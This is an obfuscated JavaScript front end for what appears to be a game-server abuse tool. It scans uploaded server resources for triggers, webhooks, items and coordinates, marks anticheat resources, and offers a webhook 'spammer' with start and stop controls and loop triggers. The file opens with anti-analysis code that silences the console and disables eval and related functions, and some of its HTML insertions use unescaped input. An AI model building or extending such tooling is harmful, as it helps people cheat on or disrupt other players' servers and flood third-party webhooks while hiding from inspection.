(function () {
  'use strict';

  console.log = function () {};
  console.warn = function () {};
  console.error = function () {};
  console.info = function () {};
  console.debug = function () {};
  // setInterval(function() {
  //     debugger;
  // }, 100);
  window.eval = function () {
    throw new Error("Access denied");
  };
  window.Function = function () {
    throw new Error("Access denied");
  };
  const _0x5a9294 = window.setTimeout;
  const _0x40f623 = window.setInterval;
  window.setTimeout = function (_0x44ccb3, _0x1ba706) {
    if (typeof _0x44ccb3 === "string") {
      throw new Error("Access denied");
    }
    return _0x5a9294.call(this, _0x44ccb3, _0x1ba706);
  };
  window.setInterval = function (_0x823886, _0x2accda) {
    if (typeof _0x823886 === "string") {
      throw new Error("Access denied");
    }
    return _0x40f623.call(this, _0x823886, _0x2accda);
  };
  document.write = function () {
    throw new Error("Access denied");
  };
  document.writeln = function () {
    throw new Error("Access denied");
  };
  const _0x3a82f8 = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
  Object.defineProperty(Element.prototype, 'innerHTML', {
    'set': function (_0x24c404) {
      if (_0x24c404.includes("Access Denied") || _0x24c404.includes("Access denied")) {
        _0x3a82f8.set.call(this, _0x24c404);
      } else {
        _0x3a82f8.set.call(this, _0x24c404);
      }
    },
    'get': _0x3a82f8.get
  });
})();
const appState = {
  'currentTab': 'triggers',
  'knownTriggers': [],
  'savedTriggers': [],
  'webhooks': [],
  'items': [],
  'coordinates': [],
  'serverDirectory': '',
  'selectedFiles': [],
  'scanResults': {
    'triggers': [],
    'webhooks': [],
    'items': [],
    'coordinates': [],
    'files': 0x0
  },
  'isSpamming': false,
  'spamInterval': null,
  'selectedWebhooks': [],
  'manualWebhooks': [],
  'settings': {
    'theme': "default",
    'autoSave': true,
    'notifications': true
  }
};
function saveTriggersToLocalStorage() {
  try {
    localStorage.setItem("savedTriggers", JSON.stringify(appState.savedTriggers));
  } catch (_0x559de5) {
    console.error("Error saving triggers to localStorage:", _0x559de5);
  }
}
function loadTriggersFromLocalStorage() {
  try {
    const _0x4a12fc = localStorage.getItem("savedTriggers");
    if (_0x4a12fc) {
      appState.savedTriggers = JSON.parse(_0x4a12fc);
      updateSavedTriggersList();
      updateStats();
    }
  } catch (_0x2fa0da) {
    console.error("Error loading triggers from localStorage:", _0x2fa0da);
    appState.savedTriggers = [];
  }
}
function loadSettingsFromLocalStorage() {
  try {
    const _0x2dd161 = localStorage.getItem('appSettings');
    if (_0x2dd161) {
      const _0x3c33d4 = JSON.parse(_0x2dd161);
      appState.settings = {
        ...appState.settings,
        ..._0x3c33d4
      };
      applyTheme(appState.settings.theme);
    }
  } catch (_0x1f4c22) {
    console.error("Error loading settings from localStorage:", _0x1f4c22);
  }
}
function saveSettingsToLocalStorage() {
  try {
    localStorage.setItem("appSettings", JSON.stringify(appState.settings));
  } catch (_0xec48c0) {
    console.error("Error saving settings to localStorage:", _0xec48c0);
  }
}
function clearAllSavedTriggers() {
  try {
    if (confirm("Are you sure you want to delete ALL saved triggers? This action cannot be undone!")) {
      appState.savedTriggers = [];
      saveTriggersToLocalStorage();
      updateSavedTriggersList();
      updateStats();
      showNotification("All saved triggers cleared", 'success');
    }
  } catch (_0xb12b70) {
    console.error("Error clearing saved triggers:", _0xb12b70);
    showNotification("Error clearing saved triggers", "error");
  }
}
function setupSettingsModal() {
  const _0x13fbb1 = document.getElementById('settings-btn');
  const _0x51235b = document.getElementById("settings-modal");
  const _0x51c790 = document.getElementById('settings-close');
  const _0x2e32df = document.getElementById("settings-overlay");
  const _0x485ca6 = document.querySelectorAll(".theme-option");
  const _0x248d7a = document.getElementById("auto-save-toggle");
  const _0x44d743 = document.getElementById("notifications-toggle");
  _0x13fbb1.addEventListener('click', () => {
    _0x51235b.style.display = "flex";
    updateSettingsUI();
  });
  const _0x4a13bb = () => {
    _0x51235b.style.display = "none";
  };
  _0x51c790.addEventListener("click", _0x4a13bb);
  _0x2e32df.addEventListener("click", _0x4a13bb);
  _0x485ca6.forEach(_0x481e7e => {
    _0x481e7e.addEventListener('click', () => {
      const _0x83255d = _0x481e7e.getAttribute("data-theme");
      changeTheme(_0x83255d);
      _0x485ca6.forEach(_0x4df510 => _0x4df510.classList.remove("active"));
      _0x481e7e.classList.add('active');
    });
  });
  _0x248d7a.addEventListener('change', _0x32a034 => {
    appState.settings.autoSave = _0x32a034.target.checked;
    saveSettingsToLocalStorage();
  });
  _0x44d743.addEventListener("change", _0x30de91 => {
    appState.settings.notifications = _0x30de91.target.checked;
    saveSettingsToLocalStorage();
  });
  document.addEventListener("keydown", _0x4d316d => {
    if (_0x4d316d.key === "Escape" && _0x51235b.style.display === "flex") {
      _0x4a13bb();
    }
  });
}
function updateSettingsUI() {
  const _0x2a5a87 = document.querySelectorAll(".theme-option");
  _0x2a5a87.forEach(_0x3ca242 => {
    _0x3ca242.classList.remove("active");
    if (_0x3ca242.getAttribute("data-theme") === appState.settings.theme) {
      _0x3ca242.classList.add("active");
    }
  });
  const _0xe51745 = document.getElementById("auto-save-toggle");
  const _0xe0b201 = document.getElementById("notifications-toggle");
  if (_0xe51745) {
    _0xe51745.checked = appState.settings.autoSave;
  }
  if (_0xe0b201) {
    _0xe0b201.checked = appState.settings.notifications;
  }
}
function changeTheme(_0x3f0f5f) {
  appState.settings.theme = _0x3f0f5f;
  applyTheme(_0x3f0f5f);
  saveSettingsToLocalStorage();
  showNotification("Theme changed to " + _0x3f0f5f, "success");
}
function applyTheme(_0x3fa638) {
  const _0x574932 = document.body;
  _0x574932.classList.remove("theme-purple", "theme-green", 'theme-orange', 'theme-red', "theme-cyan");
  if (_0x3fa638 !== "default") {
    _0x574932.classList.add('theme-' + _0x3fa638);
  }
}
function navigateToFileInExplorer(_0x5c6c4e, _0x5ed633) {
  try {
    const _0x47f3aa = _0x5c6c4e.split('/');
    const _0x31dc46 = _0x47f3aa.pop();
    const _0x2c082c = _0x47f3aa.join('/');
    const _0x4da23c = document.querySelectorAll(".folder-header");
    let _0x5948c3 = null;
    let _0x425e3c = null;
    _0x4da23c.forEach(_0x33a9e1 => {
      const _0x10e9fd = _0x33a9e1.querySelector('span').textContent;
      if (_0x10e9fd === _0x5ed633 || _0x10e9fd.includes(_0x2c082c) || _0x2c082c.includes(_0x10e9fd)) {
        const _0x1c34e3 = _0x33a9e1.nextElementSibling;
        if (_0x1c34e3 && _0x1c34e3.style.display === "none") {
          _0x33a9e1.click();
        }
        _0x5948c3 = _0x33a9e1;
        setTimeout(() => {
          const _0x5a6057 = _0x1c34e3.querySelectorAll(".resource-file");
          _0x5a6057.forEach(_0x22150f => {
            const _0x4fd1b4 = _0x22150f.querySelector("span");
            if (_0x4fd1b4 && _0x4fd1b4.textContent === _0x31dc46) {
              _0x22150f.style.backgroundColor = "rgba(102, 126, 234, 0.2)";
              _0x22150f.style.border = "1px solid #667eea";
              _0x22150f.scrollIntoView({
                'behavior': "smooth",
                'block': "center"
              });
              setTimeout(() => {
                _0x22150f.style.backgroundColor = '';
                _0x22150f.style.border = '';
              }, 0xbb8);
              _0x425e3c = _0x22150f;
            }
          });
        }, 0x64);
      }
    });
    if (_0x5948c3) {
      _0x5948c3.scrollIntoView({
        'behavior': "smooth",
        'block': 'center'
      });
    }
  } catch (_0x1b0ded) {
    console.error("Error navigating to file in explorer:", _0x1b0ded);
  }
}
function editTriggerName(_0x4566ea, _0x320978) {
  try {
    const _0xa3ba3e = appState.savedTriggers.find(_0x3d209b => _0x3d209b.id === _0x4566ea);
    if (!_0xa3ba3e) {
      return;
    }
    const _0x19e995 = document.createElement("div");
    _0x19e995.style.cssText = "\n            position: fixed;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            background: rgba(0, 0, 0, 0.8);\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            z-index: 10000;\n        ";
    const _0x1c2e4b = document.createElement("div");
    _0x1c2e4b.style.cssText = "\n            background: #2a2a2a;\n            padding: 20px;\n            border-radius: 8px;\n            border: 1px solid #667eea;\n            min-width: 300px;\n            max-width: 500px;\n        ";
    _0x1c2e4b.innerHTML = "\n            <h3 style=\"color: #ffffff; margin: 0 0 15px 0;\">Edit Trigger Name</h3>\n            <input type=\"text\" id=\"edit-trigger-name-input\" value=\"" + _0x320978 + "\" style=\"\n                width: 100%;\n                padding: 10px;\n                background: #1a1a1a;\n                border: 1px solid #667eea;\n                border-radius: 4px;\n                color: #ffffff;\n                font-size: 14px;\n                margin-bottom: 15px;\n            \">\n            <div style=\"display: flex; gap: 10px; justify-content: flex-end;\">\n                <button id=\"cancel-edit-btn\" style=\"\n                    padding: 8px 16px;\n                    background: #6c757d;\n                    color: white;\n                    border: none;\n                    border-radius: 4px;\n                    cursor: pointer;\n                    font-size: 12px;\n                \">Cancel</button>\n                <button id=\"save-edit-btn\" style=\"\n                    padding: 8px 16px;\n                    background: #667eea;\n                    color: white;\n                    border: none;\n                    border-radius: 4px;\n                    cursor: pointer;\n                    font-size: 12px;\n                \">Save</button>\n            </div>\n        ";
    _0x19e995.appendChild(_0x1c2e4b);
    document.body.appendChild(_0x19e995);
    const _0x29aa49 = _0x1c2e4b.querySelector("#edit-trigger-name-input");
    const _0x537d00 = _0x1c2e4b.querySelector("#cancel-edit-btn");
    const _0x3580a9 = _0x1c2e4b.querySelector("#save-edit-btn");
    _0x29aa49.focus();
    _0x29aa49.select();
    const _0x1837ed = () => {
      const _0x242fbe = _0x29aa49.value.trim();
      if (_0x242fbe === '') {
        showNotification("Trigger name cannot be empty", "error");
        return;
      }
      const _0x3c0b62 = appState.savedTriggers.find(_0x1ec320 => _0x1ec320.id !== _0x4566ea && _0x1ec320.resource === _0x242fbe);
      if (_0x3c0b62) {
        showNotification("A trigger with this name already exists", "error");
        return;
      }
      _0xa3ba3e.resource = _0x242fbe;
      saveTriggersToLocalStorage();
      updateSavedTriggersList();
      showNotification("Trigger name updated", "success");
      document.body.removeChild(_0x19e995);
    };
    const _0xfa8812 = () => {
      document.body.removeChild(_0x19e995);
    };
    _0x3580a9.addEventListener('click', _0x1837ed);
    _0x537d00.addEventListener("click", _0xfa8812);
    _0x29aa49.addEventListener('keypress', _0x1d2a2f => {
      if (_0x1d2a2f.key === "Enter") {
        _0x1837ed();
      }
    });
    _0x29aa49.addEventListener("keydown", _0x4e460c => {
      if (_0x4e460c.key === "Escape") {
        _0xfa8812();
      }
    });
    _0x19e995.addEventListener("click", _0x2729e2 => {
      if (_0x2729e2.target === _0x19e995) {
        _0xfa8812();
      }
    });
  } catch (_0x410fa9) {
    console.error("Error editing trigger name:", _0x410fa9);
    showNotification("Error updating trigger name", 'error');
  }
}
const tabButtons = document.querySelectorAll('.tab-btn');
const tabContents = document.querySelectorAll(".tab-content");
const actionButtons = document.querySelectorAll(".action-btn");
const searchInput = document.getElementById("search-input");
const serverDirectoryInput = document.getElementById("server-directory-input");
const browseDirectoryBtn = document.getElementById("browse-directory-btn");
const browseBtn = document.getElementById("browse-btn");
const deepScanBtn = document.getElementById("deep-scan-btn");
const clearResultsBtn = document.getElementById("clear-results-btn");
document.addEventListener("DOMContentLoaded", function () {
  loadTriggersFromLocalStorage();
  loadSettingsFromLocalStorage();
  initializeApp();
  loadSampleData();
  updateStats();
  setupSettingsModal();
  checkWebCompatibility();
});
function initializeApp() {
  tabButtons.forEach(_0x58399e => {
    _0x58399e.addEventListener('click', () => {
      const _0x32b9a8 = _0x58399e.getAttribute('data-tab');
      switchTab(_0x32b9a8);
    });
  });
  actionButtons.forEach(_0x28de09 => {
    _0x28de09.addEventListener('click', () => {
      actionButtons.forEach(_0x2e98b3 => _0x2e98b3.classList.remove('active'));
      _0x28de09.classList.add('active');
      handleActionButton(_0x28de09.textContent.trim());
    });
  });
  searchInput.addEventListener("input", handleSearch);
  const _0x2e2b86 = document.getElementById('resource-search-input');
  if (_0x2e2b86) {
    _0x2e2b86.addEventListener("input", handleResourceSearch);
  }
  browseDirectoryBtn.addEventListener("click", browseServerDirectory);
  browseBtn.addEventListener("click", browseServerDirectory);
  deepScanBtn.addEventListener('click', performDeepScan);
  clearResultsBtn.addEventListener("click", clearResults);
  initializeFormHandlers();
}
function updateSpammerSelectedWebhooks() {
  try {
    const _0x40efc0 = document.getElementById("spammer-webhooks-list");
    if (!_0x40efc0) {
      return;
    }
    _0x40efc0.innerHTML = '';
    const _0x9edec9 = [...new Set([...appState.manualWebhooks, ...appState.selectedWebhooks])];
    if (_0x9edec9.length === 0x0) {
      _0x40efc0.innerHTML = "<p style=\"color: #8b9dc3; text-align: center; font-size: 12px; padding: 20px;\">No webhooks available. Add webhooks using the input above or select from the Webhooks tab.</p>";
      return;
    }
    _0x9edec9.forEach((_0x1f9659, _0x4f15e6) => {
      const _0x20cb42 = appState.selectedWebhooks.includes(_0x1f9659);
      const _0x209987 = document.createElement('div');
      _0x209987.className = "webhook-item " + (_0x20cb42 ? "selected" : '');
      _0x209987.innerHTML = "\n                <span class=\"webhook-url\">" + _0x1f9659 + "</span>\n                <div style=\"display: flex; gap: 5px;\">\n                    <button class=\"select-btn " + (_0x20cb42 ? 'selected' : '') + "\" onclick=\"toggleWebhookSelection('" + _0x1f9659 + "')\" title=\"" + (_0x20cb42 ? 'Deselect' : "Select") + "\">\n                        <i class=\"fas " + (_0x20cb42 ? "fa-check" : "fa-plus") + "\"></i>\n                    </button>\n                    <button class=\"remove-btn\" onclick=\"removeWebhook('" + _0x1f9659 + "')\" title=\"Remove\">\n                        <i class=\"fas fa-times\"></i>\n                    </button>\n                </div>\n            ";
      _0x40efc0.appendChild(_0x209987);
    });
  } catch (_0x5cebc6) {
    console.error("Error updating spammer webhooks list:", _0x5cebc6);
  }
}
function switchTab(_0x1b6f4c) {
  tabButtons.forEach(_0x241d5f => {
    _0x241d5f.classList.remove('active');
    if (_0x241d5f.getAttribute("data-tab") === _0x1b6f4c) {
      _0x241d5f.classList.add("active");
    }
  });
  tabContents.forEach(_0x1f2c09 => {
    _0x1f2c09.classList.remove("active");
    if (_0x1f2c09.id === _0x1b6f4c + "-content") {
      _0x1f2c09.classList.add("active");
    }
  });
  appState.currentTab = _0x1b6f4c;
  if (_0x1b6f4c === "spammer") {
    updateSpammerSelectedWebhooks();
    setupSpammerEventListeners();
  }
  if (_0x1b6f4c === "editor") {
    setupEditorEventListeners();
  }
  updateStats();
}
function setupEditorEventListeners() {
  try {
    console.log("Setting up Editor event listeners...");
    const _0x486e0e = document.getElementById("loop-trigger-btn");
    const _0xbb669b = document.getElementById('keybind-trigger-btn');
    if (_0x486e0e) {
      _0x486e0e.replaceWith(_0x486e0e.cloneNode(true));
      const _0x80b471 = document.getElementById("loop-trigger-btn");
      _0x80b471.addEventListener("click", () => {
        console.log("Loop trigger button clicked!");
        handleLoopTrigger();
      });
      console.log("Loop trigger button event listener added");
    } else {
      console.error("Loop trigger button not found!");
    }
    if (_0xbb669b) {
      _0xbb669b.replaceWith(_0xbb669b.cloneNode(true));
      const _0x18eeb2 = document.getElementById("keybind-trigger-btn");
      _0x18eeb2.addEventListener('click', () => {
        console.log("Keybind trigger button clicked!");
        handleKeybindTrigger();
      });
      console.log("Keybind trigger button event listener added");
    } else {
      console.error("Keybind trigger button not found!");
    }
    console.log("Editor event listeners setup complete");
    setupEditorTabs();
    setupEditorAutoCompletion();
    setTimeout(() => {
      testEditorSetup();
    }, 0x3e8);
  } catch (_0x1ed6b8) {
    console.error("Error setting up Editor event listeners:", _0x1ed6b8);
  }
}
function initializeFormHandlers() {
  const _0x4adbc6 = document.querySelector('.send-btn');
  const _0x18e964 = document.querySelector(".clear-btn");
  const _0x4d97c7 = document.querySelector(".start-spam-btn");
  const _0x4cfb3d = document.querySelector('.stop-spam-btn');
  const _0x4d9556 = document.querySelector('.select-all-btn');
  const _0x246428 = document.querySelector(".clear-selection-btn");
  const _0x2c04fe = document.getElementById("add-webhook-btn");
  const _0x3878ba = document.getElementById("manual-webhook-url");
  const _0x3d766c = document.getElementById('coordinate-search');
  const _0x448239 = document.getElementById("coordinate-type-filter");
  if (_0x4adbc6) {
    _0x4adbc6.addEventListener("click", sendWebhookOnce);
  }
  if (_0x18e964) {
    _0x18e964.addEventListener('click', clearWebhookForm);
  }
  if (_0x4d97c7) {
    _0x4d97c7.addEventListener("click", startWebhookSpam);
  }
  if (_0x4cfb3d) {
    _0x4cfb3d.addEventListener("click", stopWebhookSpam);
  }
  if (_0x4d9556) {
    _0x4d9556.addEventListener("click", selectAllWebhooks);
  }
  if (_0x246428) {
    _0x246428.addEventListener("click", clearWebhookSelection);
  }
  if (_0x2c04fe) {
    _0x2c04fe.addEventListener("click", addManualWebhook);
  }
  if (_0x3878ba) {
    _0x3878ba.addEventListener("keypress", _0x849c36 => {
      if (_0x849c36.key === "Enter") {
        addManualWebhook();
      }
    });
  }
  if (_0x3d766c) {
    _0x3d766c.addEventListener("input", handleCoordinateSearch);
  }
  if (_0x448239) {
    _0x448239.addEventListener("change", handleCoordinateTypeFilter);
  }
  const _0x9331fe = document.getElementById("message-content");
  const _0x37ee67 = document.getElementById('override-username');
  const _0x3f35c4 = document.getElementById('embed-checkbox');
  if (_0x9331fe) {
    _0x9331fe.addEventListener("input", updatePreview);
  }
  if (_0x37ee67) {
    _0x37ee67.addEventListener("input", updatePreview);
  }
  if (_0x3f35c4) {
    _0x3f35c4.addEventListener('change', updatePreview);
  }
}
function checkWebCompatibility() {
  try {
    const _0x4615ea = "webkitdirectory" in HTMLInputElement.prototype;
    if (!_0x4615ea) {
      setTimeout(() => {
        showNotification("Web Mode: Use the Browse button to select individual files or drag & drop files directly", "info");
      }, 0x7d0);
    }
    if (!navigator.clipboard || !window.isSecureContext) {
      console.log("Clipboard API not available - using fallback methods");
    }
  } catch (_0xf25637) {
    console.error("Error checking web compatibility:", _0xf25637);
  }
}
function browseServerDirectory() {
  try {
    const _0x596c2f = "webkitdirectory" in HTMLInputElement.prototype;
    if (_0x596c2f) {
      const _0x412b91 = document.createElement("input");
      _0x412b91.type = "file";
      _0x412b91.webkitdirectory = true;
      _0x412b91.multiple = true;
      _0x412b91.addEventListener("change", _0x1243ae => {
        try {
          const _0x3f69e1 = _0x1243ae.target.files;
          if (_0x3f69e1.length > 0x0) {
            const _0xddf3ba = _0x3f69e1[0x0].webkitRelativePath.split('/')[0x0];
            serverDirectoryInput.value = _0xddf3ba;
            appState.serverDirectory = _0xddf3ba;
            appState.selectedFiles = Array.from(_0x3f69e1);
            updateResourceExplorer(_0x3f69e1);
            showNotification("Selected directory: " + _0xddf3ba + " (" + _0x3f69e1.length + " files)", "success");
          }
        } catch (_0x44cd4a) {
          console.error("Error processing directory:", _0x44cd4a);
          showNotification("Error processing directory", "error");
        }
      });
      _0x412b91.click();
    } else {
      showWebFileSelector();
    }
  } catch (_0x452ea4) {
    console.error("Error creating file input:", _0x452ea4);
    showWebFileSelector();
  }
}
function showWebFileSelector() {
  try {
    const _0x4959e7 = document.createElement("div");
    _0x4959e7.style.cssText = "\n            position: fixed;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            background: rgba(0, 0, 0, 0.8);\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            z-index: 10000;\n        ";
    const _0x49a0b6 = document.createElement("div");
    _0x49a0b6.style.cssText = "\n            background: #2a2a2a;\n            padding: 30px;\n            border-radius: 12px;\n            border: 2px solid #667eea;\n            max-width: 600px;\n            width: 90%;\n            max-height: 80vh;\n            overflow-y: auto;\n        ";
    _0x49a0b6.innerHTML = "\n            <div style=\"margin-bottom: 20px;\">\n                <h3 style=\"color: #ffffff; margin: 0 0 15px 0; display: flex; align-items: center; gap: 10px;\">\n                    <i class=\"fas fa-upload\"></i>\n                    Web File Upload\n                </h3>\n                <p style=\"color: #8b9dc3; margin: 0; line-height: 1.5;\">\n                    For web compatibility, please select individual files or use the drag & drop area below. \n                    You can select multiple files by holding Ctrl/Cmd while clicking.\n                </p>\n            </div>\n            \n            <div style=\"margin-bottom: 20px;\">\n                <label style=\"color: #8b9dc3; display: block; margin-bottom: 8px; font-weight: 600;\">\n                    SELECT FILES:\n                </label>\n                <input type=\"file\" id=\"web-file-input\" multiple accept=\".lua,.js,.json,.cfg,.txt,.xml,.html,.css,.php,.py,.md\" style=\"\n                    width: 100%;\n                    padding: 12px;\n                    background: #1a1a1a;\n                    border: 2px solid #667eea;\n                    border-radius: 6px;\n                    color: #ffffff;\n                    font-size: 14px;\n                    margin-bottom: 15px;\n                \">\n            </div>\n            \n            <div style=\"margin-bottom: 20px;\">\n                <label style=\"color: #8b9dc3; display: block; margin-bottom: 8px; font-weight: 600;\">\n                    OR DRAG & DROP FILES HERE:\n                </label>\n                <div id=\"drop-zone\" style=\"\n                    border: 2px dashed #667eea;\n                    border-radius: 8px;\n                    padding: 40px;\n                    text-align: center;\n                    background: #1a1a1a;\n                    transition: all 0.3s ease;\n                    cursor: pointer;\n                \">\n                    <i class=\"fas fa-cloud-upload-alt\" style=\"font-size: 48px; color: #667eea; margin-bottom: 15px; display: block;\"></i>\n                    <p style=\"color: #8b9dc3; margin: 0; font-size: 16px;\">Drop files here or click to browse</p>\n                    <p style=\"color: #8b9dc3; margin: 10px 0 0 0; font-size: 12px;\">Supports: .lua, .js, .json, .cfg, .txt, .xml, .html, .css, .php, .py, .md</p>\n                </div>\n            </div>\n            \n            <div style=\"display: flex; gap: 10px; justify-content: flex-end;\">\n                <button id=\"cancel-web-upload\" style=\"\n                    padding: 10px 20px;\n                    background: #6c757d;\n                    color: white;\n                    border: none;\n                    border-radius: 6px;\n                    cursor: pointer;\n                    font-size: 14px;\n                \">Cancel</button>\n                <button id=\"process-web-files\" style=\"\n                    padding: 10px 20px;\n                    background: #667eea;\n                    color: white;\n                    border: none;\n                    border-radius: 6px;\n                    cursor: pointer;\n                    font-size: 14px;\n                    font-weight: 600;\n                \">Process Files</button>\n            </div>\n        ";
    _0x4959e7.appendChild(_0x49a0b6);
    document.body.appendChild(_0x4959e7);
    const _0x520e81 = _0x49a0b6.querySelector('#web-file-input');
    const _0x453072 = _0x49a0b6.querySelector("#drop-zone");
    const _0x685542 = _0x49a0b6.querySelector("#process-web-files");
    const _0x27035a = _0x49a0b6.querySelector('#cancel-web-upload');
    let _0x5badfd = [];
    _0x520e81.addEventListener("change", _0x4f7824 => {
      _0x5badfd = Array.from(_0x4f7824.target.files);
      _0x216dc1(_0x5badfd);
    });
    _0x453072.addEventListener("dragover", _0x306375 => {
      _0x306375.preventDefault();
      _0x453072.style.borderColor = "#e91e63";
      _0x453072.style.background = "rgba(233, 30, 99, 0.1)";
    });
    _0x453072.addEventListener('dragleave', _0xfbfee4 => {
      _0xfbfee4.preventDefault();
      _0x453072.style.borderColor = "#667eea";
      _0x453072.style.background = "#1a1a1a";
    });
    _0x453072.addEventListener("drop", _0xaa5328 => {
      _0xaa5328.preventDefault();
      _0x453072.style.borderColor = "#667eea";
      _0x453072.style.background = "#1a1a1a";
      const _0x3c9a60 = Array.from(_0xaa5328.dataTransfer.files);
      _0x5badfd = _0x3c9a60.filter(_0x22c6f4 => {
        const _0x2fe830 = _0x22c6f4.name.toLowerCase().split('.').pop();
        return ["lua", 'js', "json", "cfg", "txt", "xml", "html", 'css', "php", 'py', 'md'].includes(_0x2fe830);
      });
      _0x216dc1(_0x5badfd);
    });
    _0x453072.addEventListener("click", () => {
      _0x520e81.click();
    });
    _0x685542.addEventListener('click', () => {
      if (_0x5badfd.length === 0x0) {
        showNotification("Please select at least one file", 'warning');
        return;
      }
      const _0x4b743a = _0x5badfd.map(_0x127b2d => {
        _0x127b2d.webkitRelativePath = 'web_upload/' + _0x127b2d.name;
        return _0x127b2d;
      });
      appState.serverDirectory = "web_upload";
      appState.selectedFiles = _0x4b743a;
      serverDirectoryInput.value = "web_upload";
      updateResourceExplorer(_0x4b743a);
      showNotification("Processed " + _0x5badfd.length + " files from web upload", "success");
      document.body.removeChild(_0x4959e7);
    });
    _0x27035a.addEventListener("click", () => {
      document.body.removeChild(_0x4959e7);
    });
    _0x4959e7.addEventListener('click', _0x127ac2 => {
      if (_0x127ac2.target === _0x4959e7) {
        document.body.removeChild(_0x4959e7);
      }
    });
    function _0x216dc1(_0x1b1d01) {
      const _0x262f96 = _0x49a0b6.querySelector("#drop-zone");
      if (_0x1b1d01.length > 0x0) {
        _0x262f96.innerHTML = "\n                    <i class=\"fas fa-check-circle\" style=\"font-size: 48px; color: #27ae60; margin-bottom: 15px; display: block;\"></i>\n                    <p style=\"color: #ffffff; margin: 0; font-size: 16px; font-weight: 600;\">" + _0x1b1d01.length + " file(s) selected</p>\n                    <p style=\"color: #8b9dc3; margin: 10px 0 0 0; font-size: 12px;\">Click to change selection</p>\n                ";
      } else {
        _0x262f96.innerHTML = "\n                    <i class=\"fas fa-cloud-upload-alt\" style=\"font-size: 48px; color: #667eea; margin-bottom: 15px; display: block;\"></i>\n                    <p style=\"color: #8b9dc3; margin: 0; font-size: 16px;\">Drop files here or click to browse</p>\n                    <p style=\"color: #8b9dc3; margin: 10px 0 0 0; font-size: 12px;\">Supports: .lua, .js, .json, .cfg, .txt, .xml, .html, .css, .php, .py, .md</p>\n                ";
      }
    }
  } catch (_0x13b8db) {
    console.error("Error showing web file selector:", _0x13b8db);
    showNotification("Error creating file selector", "error");
  }
}
function updateResourceExplorer(_0x240541, _0x5ce858 = '') {
  try {
    const _0x58d1bc = document.getElementById("resource-tree");
    if (!_0x58d1bc) {
      return;
    }
    _0x58d1bc.innerHTML = '';
    if (!_0x240541 || _0x240541.length === 0x0) {
      if (_0x5ce858) {
        _0x58d1bc.innerHTML = "\n                    <div class=\"resource-item\" style=\"text-align: center; color: #8b9dc3; font-style: italic; padding: 20px;\">\n                        <i class=\"fas fa-search\" style=\"margin-right: 8px;\"></i>\n                        No resources found matching \"" + _0x5ce858 + "\"\n                    </div>\n                ";
      } else {
        _0x58d1bc.innerHTML = "\n                    <div class=\"resource-item\" style=\"text-align: center; color: #8b9dc3; font-style: italic; padding: 20px;\">\n                        <i class=\"fas fa-folder\" style=\"margin-right: 8px;\"></i>\n                        Select a server directory to explore\n                    </div>\n                ";
      }
      return;
    }
    const _0x2ea400 = {};
    for (let _0x2a3f7c of _0x240541) {
      const _0x39f337 = _0x2a3f7c.webkitRelativePath || "web_upload/" + _0x2a3f7c.name;
      const _0x43d46f = _0x39f337.split('/');
      let _0x29ecdf = _0x2ea400;
      for (let _0x4bb3c8 = 0x0; _0x4bb3c8 < _0x43d46f.length - 0x1; _0x4bb3c8++) {
        const _0x1b67fd = _0x43d46f[_0x4bb3c8];
        if (!_0x29ecdf[_0x1b67fd]) {
          _0x29ecdf[_0x1b67fd] = {
            'type': "folder",
            'children': {},
            'files': []
          };
        }
        _0x29ecdf = _0x29ecdf[_0x1b67fd].children;
      }
      const _0x42bdd0 = _0x43d46f[_0x43d46f.length - 0x1];
      _0x29ecdf[_0x42bdd0] = {
        'type': "file",
        'file': _0x2a3f7c
      };
    }
    renderFolderTree(_0x58d1bc, _0x2ea400, '', _0x5ce858);
  } catch (_0x2ab9c6) {
    console.error("Error updating resource explorer:", _0x2ab9c6);
  }
}
function updateResourceExplorerWithAnticheats() {
  try {
    const _0x1e488c = appState.scanResults.anticheats || [];
    const _0x27c7af = new Map();
    _0x1e488c.forEach(_0x58bdc7 => {
      _0x27c7af.set(_0x58bdc7.resource, _0x58bdc7.name);
    });
    const _0x4d580d = document.querySelectorAll(".resource-folder .folder-header");
    _0x4d580d.forEach(_0xe404a4 => {
      const _0x34a3c4 = _0xe404a4.querySelector('span');
      if (_0x34a3c4) {
        const _0x2ca367 = _0x34a3c4.textContent.trim();
        if (_0x27c7af.has(_0x2ca367)) {
          const _0xe09dda = _0x27c7af.get(_0x2ca367);
          const _0xe2584e = _0xe404a4.querySelector(".ac-indicator");
          if (_0xe2584e) {
            _0xe2584e.remove();
          }
          const _0xa2cfcd = document.createElement("span");
          _0xa2cfcd.className = "ac-indicator";
          _0xa2cfcd.style.cssText = "\n                        background: #e74c3c;\n                        color: white;\n                        padding: 2px 6px;\n                        border-radius: 3px;\n                        font-size: 10px;\n                        font-weight: bold;\n                        margin-left: 8px;\n                        cursor: pointer;\n                        transition: background-color 0.2s;\n                    ";
          _0xa2cfcd.textContent = 'AC';
          _0xa2cfcd.title = "Anticheat: " + _0xe09dda;
          _0xa2cfcd.addEventListener("mouseenter", () => {
            _0xa2cfcd.style.backgroundColor = "#c0392b";
          });
          _0xa2cfcd.addEventListener('mouseleave', () => {
            _0xa2cfcd.style.backgroundColor = "#e74c3c";
          });
          _0xa2cfcd.addEventListener("click", _0xff5749 => {
            _0xff5749.stopPropagation();
            showNotification("Anticheat detected: " + _0xe09dda, "warning");
          });
          _0x34a3c4.parentNode.insertBefore(_0xa2cfcd, _0x34a3c4.nextSibling);
        }
      }
    });
  } catch (_0x4d2b63) {
    console.error("Error updating resource explorer with anticheats:", _0x4d2b63);
  }
}
function renderFolderTree(_0x5c1d56, _0x2e5255, _0x7c4e78, _0x3405d9 = '') {
  try {
    Object.keys(_0x2e5255).forEach(_0x16dcc9 => {
      const _0x2c4ae3 = _0x2e5255[_0x16dcc9];
      const _0x44cea8 = _0x7c4e78 ? _0x7c4e78 + '/' + _0x16dcc9 : _0x16dcc9;
      if (_0x2c4ae3.type === "folder") {
        const _0x460f0c = countFilesInFolder(_0x2c4ae3);
        if (_0x3405d9 && _0x460f0c === 0x0) {
          return;
        }
        const _0xe6b650 = document.createElement("div");
        _0xe6b650.className = 'resource-folder';
        _0xe6b650.style.cssText = "\n                    margin: 2px 0;\n                    user-select: none;\n                ";
